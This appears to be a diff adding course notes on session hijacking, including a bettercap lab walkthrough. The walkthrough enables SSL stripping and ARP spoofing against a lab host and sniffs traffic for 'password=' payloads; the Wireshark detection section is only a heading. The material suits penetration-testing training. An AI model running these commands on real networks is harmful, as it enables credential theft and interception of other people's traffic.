@@ -1,0 +1,42 @@
+Session hijacking can be either active or passive, depending on the degree of involvement of the attacker:
+
+• Active session hijacking: An attacker finds an active session and takes it over
+• Passive session hijacking: An attacker hijacks a session, and, instead of taking over, monitors and records all the traffic in that session
+Lab Tasks
+Ethical hackers or penetration testers use numerous tools and techniques to perform session hijacking on the target systems. Recommended labs that will assist you in learning various session hijacking techniques include:
+
+Perform session hijacking
+
+	• Hijack a session using Zed Attack Proxy (ZAP)
+	• Intercept HTTP traffic using bettercap
+	• Intercept HTTP traffic using Hetty
+	• Detect session hijacking
+
+• Detect session hijacking using Wireshark
+
+------
+
+Intercept HTTP Traffic using bettercap
+
+• bettercap -h and press Enter.
+•  bettercap -iface eth0
+
+• Type net.probe on and press Enter.
+• net.recon on and press Enter
+• set http.proxy.sslstrip true and press Enter. This module enables SSL stripping.
+• set arp.spoof.internal true and press Enter. This module spoofs the local connections among computers of the internal network.
+• set arp.spoof.targets 10.10.1.11 and press Enter. This module spoofs the IP address of the target host.
+• http.proxy on and press Enter. This module initiates http proxy.
+• arp.spoof on and press Enter. This module initiates ARP spoofing.
+• net.sniff on and press Enter. This module is responsible for performing sniffing on the network.
+• set net.sniff.regexp ‘.*password=.+’ and press Enter. This module will only consider the packets sent with a payload matching the given regular expression (in this case, ‘.*password=.+’).
+
+
+Intercept HTTP Traffic using Hetty
+http://localhost:8080
+
+
+Detect Session Hijacking
+
+Detect Session Hijacking using Wireshark
+
